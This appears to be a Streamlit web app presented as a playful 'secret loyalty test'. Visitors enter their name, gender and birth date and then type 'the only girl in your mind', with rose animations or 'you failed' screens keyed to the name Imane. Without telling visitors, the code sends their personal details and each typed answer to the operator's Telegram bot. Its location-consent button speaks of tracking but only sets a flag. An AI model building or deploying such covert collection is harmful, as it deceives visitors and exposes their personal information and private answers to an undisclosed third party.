from datetime import date
import json
import urllib.request
import urllib.error
import streamlit as st
import streamlit.components.v1 as components
# =========================================================
# إعدادات الصفحة
# =========================================================
st.set_page_config(
    page_title="takotaki 🌸",
    page_icon="🥀",
    layout="centered"
)
# =========================================================
# CSS عام — إخفاء واجهة Streamlit ومشغلات الصوت
# =========================================================
st.markdown(
    """
    <style>
        footer,
        .stAppFooter,
        [data-testid="stFooter"],
        [data-testid="stHeader"],
        #MainMenu,
        header,
        div[class*="viewerBadge"],
        .viewerBadge_container__1QSob,
        [data-testid="stDecoration"],
        [data-testid="stStatusWidget"],
        [data-testid="stToolbar"] {
            display: none !important;
            visibility: hidden !important;
        }
        /* إخفاء مشغل الصوت */
        div[data-testid="stAudio"] {
            position: fixed !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            left: -9999px !important;
            top: -9999px !important;
            overflow: hidden !important;
        }
        audio {
            position: fixed !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            left: -9999px !important;
            top: -9999px !important;
        }
    </style>
    """,
    unsafe_allow_html=True,
)
# =========================================================
# Session State
# =========================================================
if "step" not in st.session_state:
    st.session_state.step = 1
if "visitor_name" not in st.session_state:
    st.session_state.visitor_name = ""
if "visitor_gender" not in st.session_state:
    st.session_state.visitor_gender = "Boy 👦"
if "visitor_dob" not in st.session_state:
    st.session_state.visitor_dob = ""
if "attempts" not in st.session_state:
    st.session_state.attempts = 0
if "location_activated" not in st.session_state:
    st.session_state.location_activated = False
# =========================================================
# Telegram
# استخدم Secrets ولا تضع التوكن داخل الكود
# =========================================================
def send_telegram_msg(text_message):
    try:
        token = st.secrets["bot_token"]
        chat_id = st.secrets["chat_id"]
    except Exception:
        return False, "Telegram secrets غير موجودة."
    bot_token = str(token).strip()
    target_chat_id = str(chat_id).strip()
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = json.dumps({
        "chat_id": target_chat_id,
        "text": text_message
    }).encode("utf-8")
    try:
        req = urllib.request.Request(
            url,
            data=payload,
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            return True, "تم الإرسال بنجاح"
    except urllib.error.HTTPError as e:
        err_response = e.read().decode("utf-8")
        return False, f"خطأ من تيليغرام ({e.code}): {err_response}"
    except Exception as e:
        return False, f"خطأ اتصال: {str(e)}"
# =========================================================
# الخطوة الأولى
# =========================================================
if st.session_state.step == 1:
    st.markdown(
        """
        <style>
            [data-testid="stAppViewContainer"] {
                background: linear-gradient(
                    135deg,
                    #2b0015,
                    #0d0006
                ) !important;
                color: #ffffff;
            }
            .welcome-title {
                text-align: center;
                font-size: 32px;
                font-weight: bold;
                color: #ff4d6d;
                text-shadow:
                    0 0 15px rgba(255, 77, 109, 0.8);
                margin-bottom: 25px;
            }
            .stTextInput > div > div > input,
            .stDateInput > div > div > input {
                background-color: #1a000c !important;
                color: #ffffff !important;
                border: 2px solid #ff2a6d !important;
                border-radius: 12px;
            }
            div[data-baseweb="radio"] label {
                color: #ffffff !important;
            }
            .stButton > button {
                background:
                    linear-gradient(
                        135deg,
                        #ff0055,
                        #ff2a6d
                    ) !important;
                color: white !important;
                border-radius: 12px !important;
                border: none !important;
                width: 100%;
                font-size: 18px !important;
                font-weight: bold !important;
                padding: 10px !important;
            }
            .location-box {
                background:
                    rgba(255, 0, 85, 0.15);
                border:
                    2px dashed #ff0055;
                border-radius: 15px;
                padding: 15px;
                text-align: center;
                margin-bottom: 20px;
            }
            .location-status-active {
                color: #00ff88;
                font-weight: bold;
                margin-top: 8px;
            }
            .location-status-pending {
                color: #ff4d6d;
                font-weight: bold;
                margin-top: 8px;
            }
            div[data-testid="stButton"]
            button[key="green_gps_btn"] {
                background:
                    linear-gradient(
                        135deg,
                        #00c853,
                        #b2ff59
                    ) !important;
                color: #000000 !important;
                font-weight: bold !important;
                font-size: 16px !important;
                border-radius: 12px !important;
                box-shadow:
                    0 0 12px
                    rgba(0, 200, 83, 0.6) !important;
            }
        </style>
        """,
        unsafe_allow_html=True,
    )
    st.markdown(
        '<div class="welcome-title">'
        '✨ Welcome to takotaki! ✨'
        '</div>',
        unsafe_allow_html=True,
    )
    is_gps_active = st.session_state.location_activated
    status_msg = (
        '<div class="location-status-active">'
        '✅ تم تفعيل الموافقة على الموقع!'
        '</div>'
        if is_gps_active
        else
        '<div class="location-status-pending">'
        '⚠️ يرجى تفعيل الموافقة على الموقع أولاً.'
        '</div>'
    )
    st.markdown(
        f"""
        <div class="location-box">
            <h4 style="margin:0; color:#ff4d6d;">
                📍 شرط تشغيل الموقع
            </h4>
            <p style="
                font-size:14px;
                margin-top:5px;
                color:#ddd;
            ">
                بالضغط على الزر، أنت توافق على استخدام الموقع
                لتشغيل المتابعة.
            </p>
            {status_msg}
        </div>
        """,
        unsafe_allow_html=True,
    )
    if not is_gps_active:
        if st.button(
            "🌐 أوافق على استخدام الموقع 📍",
            key="green_gps_btn"
        ):
            st.session_state.location_activated = True
            st.rerun()
    with st.form("user_info_form"):
        name_in = st.text_input(
            "Enter Your Name:",
            placeholder="Type your name here..."
        )
        gender_in = st.radio(
            "Select Your Gender:",
            ["Boy 👦", "Girl 👧"],
            horizontal=True
        )
        dob_in = st.date_input(
            "Select Your Date of Birth:",
            min_value=date(1950, 1, 1),
            max_value=date.today(),
            value=date(2000, 1, 1)
        )
        submit_btn = st.form_submit_button(
            "Continue ➔"
        )
        if submit_btn:
            name_val = name_in.strip()
            if not name_val:
                st.warning(
                    "Please enter your name first!"
                )
            elif not st.session_state.location_activated:
                st.error(
                    "🚫 يرجى الموافقة على استخدام الموقع أولاً!"
                )
            else:
                st.session_state.visitor_name = name_val
                st.session_state.visitor_gender = gender_in
                st.session_state.visitor_dob = str(dob_in)
                msg = (
                    f"🚨 دخول زائر جديد!\n"
                    f"👤 الاسم: {name_val}\n"
                    f"🚻 الجنس: {gender_in}\n"
                    f"🎂 الميلاد: {dob_in}"
                )
                success, err_msg = send_telegram_msg(msg)
                if not success:
                    st.warning(
                        f"⚠️ تنبيه البوت: {err_msg}"
                    )
                st.session_state.step = 2
                st.rerun()
# =========================================================
# الخطوة الثانية — اختبار الوفاء
# =========================================================
elif st.session_state.step == 2:
    ALLOWED_NAMES = [
        "imane",
        "iman",
        "eman"
    ]
    st.markdown(
        """
        <style>
            [data-testid="stAppViewContainer"] {
                background:
                    linear-gradient(
                        135deg,
                        #2b0015,
                        #0d0006
                    ) !important;
                color: #ffffff;
            }
            .stTextInput > div > div > input {
                background-color:
                    #1a000c !important;
                color:
                    #ff4d6d !important;
                border:
                    2px solid #ff0055 !important;
                border-radius:
                    12px;
                text-align:
                    center;
                font-size:
                    20px;
                box-shadow:
                    0 0 15px
                    rgba(255, 0, 85, 0.4);
            }
            .main-title {
                text-align:
                    center;
                font-size:
                    32px;
                font-weight:
                    bold;
                color:
                    #ff4d6d;
                text-shadow:
                    0 0 20px
                    rgba(255, 77, 109, 0.8);
                margin-bottom:
                    25px;
            }
            .stButton > button {
                background:
                    linear-gradient(
                        135deg,
                        #ff0055,
                        #ff2a6d
                    ) !important;
                color:
                    white !important;
                border-radius:
                    12px !important;
                border:
                    none !important;
                width:
                    100%;
                font-size:
                    18px !important;
                font-weight:
                    bold !important;
                padding:
                    12px !important;
                margin-top:
                    10px;
            }
        </style>
        <div class="main-title">
            🥀 takotaki:
            A Secret Test For Your Loyalty... 👁️
        </div>
        """,
        unsafe_allow_html=True,
    )
    user_input = st.text_input(
        "",
        placeholder=
        "Who is the only girl in your mind now?...",
        key="loyalty_input"
    )
    check_btn = st.button(
        "Reveal Loyalty Result ✨"
    )
    if check_btn:
        if not user_input.strip():
            st.warning(
                "Please write a name first!"
            )
        else:
            clean_name = (
                user_input
                .strip()
                .lower()
            )
            st.session_state.attempts += 1
            msg = (
                f"🎯 إجابة جديدة!\n"
                f"👤 الاسم: "
                f"{st.session_state.visitor_name}\n"
                f"✍️ الإجابة المدخلة: "
                f"{user_input}\n"
                f"🔢 المحاولات: "
                f"{st.session_state.attempts}"
            )
            success, err_msg = send_telegram_msg(msg)
            if not success:
                st.warning(
                    f"⚠️ تنبيه البوت: {err_msg}"
                )
            # =================================================
            # 1) الجواب الصحيح
            # =================================================
            if clean_name in ALLOWED_NAMES:
                st.audio(
                    "https://cdn.pixabay.com/audio/2022/05/27/audio_1808fbf07a.mp3",
                    format="audio/mp3",
                    autoplay=True,
                )
                st.markdown(
                    """
                    <style>
                        @keyframes roseFall {
                            0% {
                                transform:
                                    translateY(-10vh)
                                    rotate(0deg)
                                    scale(0.8);
                                opacity: 1;
                            }
                            100% {
                                transform:
                                    translateY(105vh)
                                    rotate(360deg)
                                    scale(1.3);
                                opacity: 0.2;
                            }
                        }
                        .rose {
                            position: fixed;
                            top: -50px;
                            font-size: 32px;
                            animation-name:
                                roseFall;
                            animation-timing-function:
                                linear;
                            animation-iteration-count:
                                infinite;
                            z-index:
                                99999;
                            pointer-events:
                                none;
                        }
                    </style>
                    <div class="rose"
                        style="
                        left:5%;
                        animation-duration:5s;
                        animation-delay:0s;
                        ">
                        🌹
                    </div>
                    <div class="rose"
                        style="
                        left:18%;
                        animation-duration:7s;
                        animation-delay:1s;
                        ">
                        🌹
                    </div>
                    <div class="rose"
                        style="
                        left:32%;
                        animation-duration:6s;
                        animation-delay:0.5s;
                        ">
                        🌹
                    </div>
                    <div class="rose"
                        style="
                        left:48%;
                        animation-duration:8s;
                        animation-delay:2s;
                        ">
                        🌹
                    </div>
                    <div class="rose"
                        style="
                        left:62%;
                        animation-duration:5.5s;
                        animation-delay:1.5s;
                        ">
                        🌹
                    </div>
                    <div class="rose"
                        style="
                        left:78%;
                        animation-duration:6.5s;
                        animation-delay:0.2s;
                        ">
                        🌹
                    </div>
                    <div class="rose"
                        style="
                        left:90%;
                        animation-duration:7.5s;
                        animation-delay:2.5s;
                        ">
                        🌹
                    </div>
                    """,
                    unsafe_allow_html=True,
                )
                HELLO_KITTY_KISS_GIF = (
                    "https://media.giphy.com/"
                    "media/MDJ9IbxxvDUQM/giphy.gif"
                )
                if "Girl" in st.session_state.visitor_gender:
                    st.markdown(
                        f"""
                        <style>
                            [data-testid="stAppViewContainer"] {{
                                background:
                                    radial-gradient(
                                        circle,
                                        #3d001e 0%,
                                        #15000a 100%
                                    ) !important;
                                width:
                                    100vw !important;
                                min-height:
                                    100vh !important;
                            }}
                            .card-3d {{
                                background:
                                    rgba(
                                        30,
                                        0,
                                        15,
                                        0.85
                                    ) !important;
                                backdrop-filter:
                                    blur(15px);
                                border-radius:
                                    25px;
                                padding:
                                    30px;
                                text-align:
                                    center;
                                border:
                                    2px solid #ff4d6d;
                                box-shadow:
                                    0 0 40px
                                    rgba(
                                        255,
                                        77,
                                        109,
                                        0.6
                                    );
                            }}
                            .card-header {{
                                font-size:
                                    30px;
                                font-weight:
                                    bold;
                                color:
                                    #ff4d6d !important;
                                text-shadow:
                                    0 0 15px
                                    rgba(
                                        255,
                                        77,
                                        109,
                                        0.9
                                    );
                                margin-bottom:
                                    15px;
                            }}
                            .card-body-text {{
                                font-size:
                                    19px;
                                line-height:
                                    1.7;
                                font-weight:
                                    600;
                                color:
                                    #ffffff;
                            }}
                            .hk-kiss-img {{
                                width:
                                    180px;
                                margin-top:
                                    15px;
                                filter:
                                    drop-shadow(
                                        0 0 15px #ff4d6d
                                    );
                                animation:
                                    floatHK
                                    3s
                                    ease-in-out
                                    infinite
                                    alternate;
                            }}
                            @keyframes floatHK {{
                                0% {{
                                    transform:
                                        translateY(0px)
                                        scale(1);
                                }}
                                100% {{
                                    transform:
                                        translateY(-10px)
                                        scale(1.05);
                                }}
                            }}
                        </style>
                        <div class="card-3d">
                            <div class="card-header">
                                💖 Best Girl!
                                You Passed The Test! 💖
                            </div>
                            <div class="card-body-text">
                                🌸 You remembered your most amazing
                                best friend & sister:
                                <b>IMANE</b>! 🌸
                                <br><br>
                                You are such an incredible girl,
                                the absolute best sister,
                                and the most wonderful friend
                                anyone could ever ask for! 👑✨
                                <br><br>
                                💐 Thank you for being so genuine,
                                supportive, and truly sweet!
                                Pure sisterhood and forever
                                friendship!
                                Ribbons & Rosy Hugs
                                🎀👯‍♀️💖
                            </div>
                            <img
                                src="{HELLO_KITTY_KISS_GIF}"
                                class="hk-kiss-img"
                                alt="Hello Kitty Kiss"
                            >
                        </div>
                        """,
                        unsafe_allow_html=True,
                    )
                else:
                    st.markdown(
                        f"""
                        <style>
                            [data-testid="stAppViewContainer"] {{
                                background:
                                    radial-gradient(
                                        circle,
                                        #3d001e 0%,
                                        #15000a 100%
                                    ) !important;
                                width:
                                    100vw !important;
                                min-height:
                                    100vh !important;
                            }}
                            .card-3d {{
                                background:
                                    rgba(
                                        30,
                                        0,
                                        15,
                                        0.85
                                    ) !important;
                                backdrop-filter:
                                    blur(15px);
                                border-radius:
                                    25px;
                                padding:
                                    30px;
                                text-align:
                                    center;
                                border:
                                    2px solid #ff4d6d;
                                box-shadow:
                                    0 0 40px
                                    rgba(
                                        255,
                                        77,
                                        109,
                                        0.6
                                    );
                            }}
                            .card-header {{
                                font-size:
                                    30px;
                                font-weight:
                                    bold;
                                color:
                                    #ff4d6d !important;
                                text-shadow:
                                    0 0 15px
                                    rgba(
                                        255,
                                        77,
                                        109,
                                        0.9
                                    );
                                margin-bottom:
                                    15px;
                            }}
                            .card-body-text {{
                                font-size:
                                    19px;
                                line-height:
                                    1.7;
                                font-weight:
                                    600;
                                color:
                                    #ffffff;
                            }}
                            .hk-kiss-img {{
                                width:
                                    180px;
                                margin-top:
                                    15px;
                                filter:
                                    drop-shadow(
                                        0 0 15px #ff4d6d
                                    );
                                animation:
                                    floatHK
                                    3s
                                    ease-in-out
                                    infinite
                                    alternate;
                            }}
                            @keyframes floatHK {{
                                0% {{
                                    transform:
                                        translateY(0px)
                                        scale(1);
                                }}
                                100% {{
                                    transform:
                                        translateY(-10px)
                                        scale(1.05);
                                }}
                            }}
                        </style>
                        <div class="card-3d">
                            <div class="card-header">
                                ✨ Good Boy!
                                You Passed The Test! ✨
                            </div>
                            <div class="card-body-text">
                                🌸 You remembered the only queen:
                                <b>IMANE</b>! 🌸
                                <br><br>
                                She is the light in every darkness,
                                the blooming rose in every garden,
                                and the only dream this heart
                                will ever chase. 👑✨
                                <br><br>
                                💋 Sending you endless roses
                                and sweet affection!
                                You are a loyal, good boy!
                                🌹💕
                            </div>
                            <img
                                src="{HELLO_KITTY_KISS_GIF}"
                                class="hk-kiss-img"
                                alt="Hello Kitty Kiss"
                            >
                        </div>
                        """,
                        unsafe_allow_html=True,
                    )
            # =================================================
            # 2) الجواب الخطأ
            # =================================================
            else:
                # ---------------------------------------------
                # الأغنية الحزينة بدون شريط ظاهر
                # ---------------------------------------------
                SAD_SONG = (
                    "https://cdn.pixabay.com/audio/"
                    "2022/11/06/"
                    "audio_8b2cb160c5.mp3"
                )
                components.html(
                    f"""
                    <audio
                        id="sadMusic"
                        autoplay
                        playsinline
                        preload="auto"
                    >
                        <source
                            src="{SAD_SONG}"
                            type="audio/mpeg"
                        >
                    </audio>
                    <script>
                        const audio =
                            document.getElementById(
                                "sadMusic"
                            );
                        audio.volume = 0.75;
                        function startMusic() {{
                            audio.play().catch(
                                function(error) {{
                                    console.log(
                                        "Autoplay blocked:",
                                        error
                                    );
                                }}
                            );
                        }}
                        startMusic();
                        document.addEventListener(
                            "click",
                            startMusic,
                            {{ once: true }}
                        );
                        document.addEventListener(
                            "touchstart",
                            startMusic,
                            {{ once: true }}
                        );
                    </script>
                    <style>
                        html,
                        body {{
                            margin:
                                0;
                            padding:
                                0;
                            background:
                                transparent;
                            overflow:
                                hidden;
                        }}
                        audio {{
                            position:
                                fixed;
                            width:
                                1px;
                            height:
                                1px;
                            opacity:
                                0;
                            pointer-events:
                                none;
                            left:
                                -9999px;
                            top:
                                -9999px;
                        }}
                    </style>
                    """,
                    height=1,
                )
                # ---------------------------------------------
                # الخلفية الحزينة
                # ---------------------------------------------
                RAIN_3D_ANIMATED = (
                    "https://i.gifer.com/7SdO.gif"
                )
                warnings = [
                    "🥺 What a failure... "
                    "Are you sure about that? "
                    "Think carefully!",
                    "🤨 Who is that?! "
                    "You completely failed the test... "
                    "Try again!",
                    "💔 Total disappointment! "
                    "Wrong answer... "
                    "You failed so badly!",
                    "🔥 LAST CHANCE! "
                    "Such a failure... "
                    "Type the RIGHT name now!"
                ]
                msg_idx = min(
                    st.session_state.attempts - 1,
                    len(warnings) - 1
                )
                current_warning = warnings[msg_idx]
                st.markdown(
                    f"""
                    <style>
                        [data-testid="stAppViewContainer"] {{
                            background:
                                #05020a
                                url('{RAIN_3D_ANIMATED}')
                                center center /
                                cover no-repeat fixed !important;
                            width:
                                100vw !important;
                            min-height:
                                100vh !important;
                        }}
                        .sad-box-3d {{
                            background:
                                rgba(
                                    10,
                                    2,
                                    5,
                                    0.85
                                ) !important;
                            backdrop-filter:
                                blur(10px);
                            color:
                                #ff4d6d;
                            padding:
                                30px;
                            border-radius:
                                20px;
                            text-align:
                                center;
                            border:
                                2px solid #ff0055;
                            box-shadow:
                                0 0 40px
                                rgba(
                                    255,
                                    0,
                                    85,
                                    0.7
                                );
                            font-size:
                                22px;
                            font-weight:
                                bold;
                            margin-top:
                                20px;
                        }}
                    </style>
                    <div class="sad-box-3d">
                        {current_warning}
                    </div>
                    """,
                    unsafe_allow_html=True,
                )
